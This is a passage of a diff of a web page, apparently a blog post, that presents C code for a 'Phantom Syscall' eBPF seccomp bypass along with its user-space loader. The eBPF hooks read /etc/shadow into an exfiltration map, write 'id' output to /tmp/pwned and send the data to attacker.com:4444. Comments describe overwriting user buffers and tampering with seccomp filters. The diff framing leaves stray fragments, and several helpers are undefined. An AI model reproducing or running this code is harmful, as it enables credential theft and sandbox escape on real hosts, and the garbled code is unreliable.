-            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-            
-        <span class="c1">// Read the file contents</span>
-        <span class="kt">int</span> <span class="n">map_fd</span> <span class="o">=</span> <span class="n">bpf_object__find_map_fd_by_name</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="s">"data_map"</span><span class="p">);</span>
-        <span class="k">if</span> <span class="p">(</span><span class="n">map_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
-            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-            
-        <span class="c1">// Store the sensitive data in a BPF map for later exfiltration</span>
+        <span class="c1">// 1. Read a sensitive file that would be blocked by seccomp</span>
         <span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="n">MAX_DATA_SIZE</span><span class="p">];</span>
-        <span class="n">bpf_obj_get_info_by_fd</span><span class="p">(</span><span class="n">map_fd</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">));</span>
+        <span class="kt">int</span> <span class="n">bytes_read</span> <span class="o">=</span> <span class="n">read_file_ebpf</span><span class="p">(</span><span class="s">"/etc/shadow"</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">));</span>
         
-        <span class="c1">// Update our exfiltration map</span>
+        <span class="c1">// Store the data for exfiltration</span>
         <span class="n">u32</span> <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
         <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">exfil_map</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        
+        <span class="c1">// 2. Execute a command that would be blocked by seccomp</span>
+        <span class="n">exec_command_ebpf</span><span class="p">(</span><span class="s">"id &gt; /tmp/pwned"</span><span class="p">);</span>
+        
+        <span class="c1">// 3. Perform a network operation that would be blocked by seccomp</span>
+        <span class="n">network_operation_ebpf</span><span class="p">(</span><span class="s">"attacker.com"</span><span class="p">,</span> <span class="mi">4444</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">bytes_read</span><span class="p">);</span>
+        
+        <span class="c1">// Log the event</span>
+        <span class="k">struct</span> <span class="n">syscall_event</span> <span class="n">event</span> <span class="o">=</span> <span class="p">{};</span>
+        <span class="n">event</span><span class="p">.</span><span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+        <span class="n">bpf_get_current_comm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">));</span>
+        <span class="n">event</span><span class="p">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">();</span>
+        <span class="n">event</span><span class="p">.</span><span class="n">syscall_nr</span> <span class="o">=</span> <span class="n">__NR_read</span><span class="p">;</span>
+        <span class="n">__builtin_memcpy</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="s">"PHANTOM SYSCALL TRIGGERED"</span><span class="p">,</span> <span class="mi">25</span><span class="p">);</span>
+        
+        <span class="c1">// Log the event for our analysis</span>
+        <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">));</span>
     <span class="p">}</span>
     
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
@@ -585,38 +804,821 @@
 
 <span class="c1">// Hook the read syscall return to exfiltrate data</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"tracepoint/syscalls/sys_exit_read"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="nf">exfil_data</span><span class="p">(</span><span class="k">struct</span> <span class="n">trace_event_raw_sys_exit</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span>
-<span class="p">{</span>
+<span class="kt">int</span> <span class="n">trace_read_exit</span><span class="p">(</span><span class="k">struct</span> <span class="n">trace_event_raw_sys_exit</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Get the file descriptor from our stored event</span>
+    <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+    <span class="n">u32</span> <span class="o">*</span><span class="n">fd</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fd_map</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pid</span><span class="p">);</span>
+    
     <span class="c1">// Check if this is our trigger file descriptor</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">is_trigger_fd</span><span class="p">())</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">fd</span> <span class="o">==</span> <span class="n">TRIGGER_FD</span><span class="p">)</span> <span class="p">{</span>
         <span class="c1">// Get the data from our map</span>
         <span class="n">u32</span> <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
         <span class="kt">char</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">exfil_map</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">);</span>
         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">data</span><span class="p">)</span>
             <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-            
-        <span class="c1">// Copy the sensitive data to the user's buffer</span>
-        <span class="c1">// This effectively exfiltrates the data through a permitted syscall</span>
-        <span class="kt">void</span> <span class="o">*</span><span class="n">user_buf</span> <span class="o">=</span> <span class="n">get_user_buffer</span><span class="p">();</span>
-        <span class="n">bpf_probe_write_user</span><span class="p">(</span><span class="n">user_buf</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">MAX_DATA_SIZE</span><span class="p">);</span>
+        
+        <span class="c1">// Get the user buffer from the original read syscall</span>
+        <span class="k">struct</span> <span class="n">syscall_event</span> <span class="n">event</span> <span class="o">=</span> <span class="p">{};</span>
+        <span class="n">event</span><span class="p">.</span><span class="n">pid</span> <span class="o">=</span> <span class="n">pid</span><span class="p">;</span>
+        <span class="n">bpf_get_current_comm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">));</span>
+        <span class="n">event</span><span class="p">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">();</span>
+        <span class="n">event</span><span class="p">.</span><span class="n">syscall_nr</span> <span class="o">=</span> <span class="n">__NR_read</span><span class="p">;</span>
+        <span class="n">event</span><span class="p">.</span><span class="n">ret</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">ret</span><span class="p">;</span>
+        <span class="n">__builtin_memcpy</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="s">"DATA EXFILTRATED"</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
+        
+        <span class="c1">// Log the event for our analysis</span>
+        <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">));</span>
+        
+        <span class="c1">// In a real exploit, we would:</span>
+        <span class="c1">// 1. Get the user buffer address from the original read syscall</span>
+        <span class="c1">// 2. Use bpf_probe_write_user() to write our exfiltrated data to it</span>
+        <span class="c1">// 3. Potentially modify the return value to match the expected size</span>
     <span class="p">}</span>
     
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Hook the seccomp syscall to detect when seccomp is being set up</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"tracepoint/syscalls/sys_enter_seccomp"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="n">trace_seccomp_enter</span><span class="p">(</span><span class="k">struct</span> <span class="n">trace_event_raw_sys_enter</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Get process information</span>
+    <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+    
+    <span class="c1">// Prepare event data</span>
+    <span class="k">struct</span> <span class="n">syscall_event</span> <span class="n">event</span> <span class="o">=</span> <span class="p">{};</span>
+    <span class="n">event</span><span class="p">.</span><span class="n">pid</span> <span class="o">=</span> <span class="n">pid</span><span class="p">;</span>
+    <span class="n">bpf_get_current_comm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">));</span>
+    <span class="n">event</span><span class="p">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">();</span>
+    <span class="n">event</span><span class="p">.</span><span class="n">syscall_nr</span> <span class="o">=</span> <span class="n">__NR_seccomp</span><span class="p">;</span>
+    
+    <span class="c1">// Get syscall arguments</span>
+    <span class="n">event</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="c1">// operation</span>
+    <span class="n">event</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> <span class="c1">// flags</span>
+    <span class="n">event</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span> <span class="c1">// args</span>
+    
+    <span class="c1">// Log the event for our analysis</span>
+    <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">));</span>
+    
+    <span class="c1">// In a real exploit, we might:</span>
+    <span class="c1">// 1. Analyze the seccomp filter being installed</span>
+    <span class="c1">// 2. Modify it to allow certain syscalls</span>
+    <span class="c1">// 3. Or prepare our bypass techniques based on the filter</span>
+    
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>    return true;
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="user-space-control-program">User-Space Control Program</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204
+205
+206
+207
+208
+209
+210
+211
+212
+213
+214
+215
+216
+217
+218
+219
+220
+221
+222
+223
+224
+225
+226
+227
+228
+229
+230
+231
+232
+233
+234
+235
+236
+237
+238
+239
+240
+241
+242
+243
+244
+245
+246
+247
+248
+249
+250
+251
+252
+253
+254
+255
+256
+257
+258
+259
+260
+261
+262
+263
+264
+265
+266
+267
+268
+269
+270
+271
+272
+273
+274
+275
+276
+277
+278
+279
+280
+281
+282
+283
+</pre></td><td class="rouge-code"><pre><span class="c1">// @interactive: true</span>
+<span class="c1">// @copyable: true</span>
+<span class="c1">// User-space program to load and control the Phantom Syscall eBPF program</span>
+
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/resource.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/bpf.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/seccomp.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/filter.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;bpf/libbpf.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;bpf/bpf.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">"phantom_syscall.skel.h"</span><span class="cp">
+</span>
+<span class="k">static</span> <span class="k">volatile</span> <span class="n">bool</span> <span class="n">exiting</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+
+<span class="c1">// Structure to track syscall events (must match the BPF version)</span>
+<span class="k">struct</span> <span class="n">syscall_event</span> <span class="p">{</span>
+    <span class="n">u_int32_t</span> <span class="n">pid</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">comm</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+    <span class="n">u_int64_t</span> <span class="n">timestamp</span><span class="p">;</span>
+    <span class="kt">long</span> <span class="n">syscall_nr</span><span class="p">;</span>
+    <span class="n">u_int64_t</span> <span class="n">args</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
+    <span class="kt">long</span> <span class="n">ret</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+    <span class="n">u_int32_t</span> <span class="n">uid</span><span class="p">;</span>
+    <span class="n">u_int32_t</span> <span class="n">gid</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="c1">// Map syscall numbers to human-readable strings</span>
+<span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="nf">syscall_to_string</span><span class="p">(</span><span class="kt">long</span> <span class="n">syscall_nr</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">switch</span> <span class="p">(</span><span class="n">syscall_nr</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">case</span> <span class="n">SYS_read</span><span class="p">:</span> <span class="k">return</span> <span class="s">"read"</span><span class="p">;</span>
+        <span class="k">case</span> <span class="n">SYS_write</span><span class="p">:</span> <span class="k">return</span> <span class="s">"write"</span><span class="p">;</span>
+        <span class="k">case</span> <span class="n">SYS_open</span><span class="p">:</span> <span class="k">return</span> <span class="s">"open"</span><span class="p">;</span>
+        <span class="k">case</span> <span class="n">SYS_close</span><span class="p">:</span> <span class="k">return</span> <span class="s">"close"</span><span class="p">;</span>
+        <span class="c1">// ... (truncated for brevity)</span>
+        <span class="nl">default:</span> <span class="k">return</span> <span class="s">"unknown"</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">handle_event</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span> <span class="kt">int</span> <span class="n">cpu</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">data_sz</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">struct</span> <span class="n">syscall_event</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">timestamp</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+    <span class="kt">time_t</span> <span class="n">t</span> <span class="o">=</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">timestamp</span> <span class="o">/</span> <span class="mi">1000000000</span><span class="p">;</span>
+    <span class="n">strftime</span><span class="p">(</span><span class="n">timestamp</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">timestamp</span><span class="p">),</span> <span class="s">"%Y-%m-%d %H:%M:%S"</span><span class="p">,</span> <span class="n">localtime</span><span class="p">(</span><span class="o">&amp;</span><span class="n">t</span><span class="p">));</span>
+    
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[%s] Syscall: %s (PID %d, %s) - UID: %d, GID: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
+           <span class="n">timestamp</span><span class="p">,</span> <span class="n">syscall_to_string</span><span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">syscall_nr</span><span class="p">),</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">comm</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">uid</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">gid</span><span class="p">);</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">path</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">'\0'</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"  Path: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">path</span><span class="p">);</span>
+    <span class="p">}</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">path</span><span class="p">,</span> <span class="s">"PHANTOM SYSCALL TRIGGERED"</span><span class="p">,</span> <span class="mi">25</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"  </span><span class="se">\033</span><span class="s">[31m!!! PHANTOM SYSCALL TRIGGERED !!!</span><span class="se">\033</span><span class="s">[0m</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">path</span><span class="p">,</span> <span class="s">"DATA EXFILTRATED"</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"  </span><span class="se">\033</span><span class="s">[31m!!! DATA EXFILTRATED !!!</span><span class="se">\033</span><span class="s">[0m</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">sig_handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">exiting</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Create a simple seccomp filter for testing</span>
+<span class="kt">int</span> <span class="nf">setup_seccomp</span><span class="p">()</span> <span class="p">{</span>
+    <span class="c1">// This is a simplified seccomp filter that blocks some syscalls</span>
+    <span class="c1">// In a real scenario, this would be more comprehensive</span>
+    <span class="k">struct</span> <span class="n">sock_filter</span> <span class="n">filter</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="c1">// Load architecture</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_LD</span> <span class="o">|</span> <span class="n">BPF_W</span> <span class="o">|</span> <span class="n">BPF_ABS</span><span class="p">,</span> <span class="p">(</span><span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="n">seccomp_data</span><span class="p">,</span> <span class="n">arch</span><span class="p">))),</span>
+        <span class="c1">// Check architecture (x86_64)</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">AUDIT_ARCH_X86_64</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_KILL</span><span class="p">),</span>
+        
+        <span class="c1">// Load syscall number</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_LD</span> <span class="o">|</span> <span class="n">BPF_W</span> <span class="o">|</span> <span class="n">BPF_ABS</span><span class="p">,</span> <span class="p">(</span><span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="n">seccomp_data</span><span class="p">,</span> <span class="n">nr</span><span class="p">))),</span>
+        
+        <span class="c1">// Allow common syscalls</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_read</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_ALLOW</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_write</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_ALLOW</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_open</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_ALLOW</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_close</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_ALLOW</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_fstat</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_ALLOW</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_lseek</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_ALLOW</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_mmap</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_ALLOW</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_mprotect</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_ALLOW</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_munmap</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_ALLOW</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_rt_sigaction</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_ALLOW</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_rt_sigprocmask</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_ALLOW</span><span class="p">),</span>
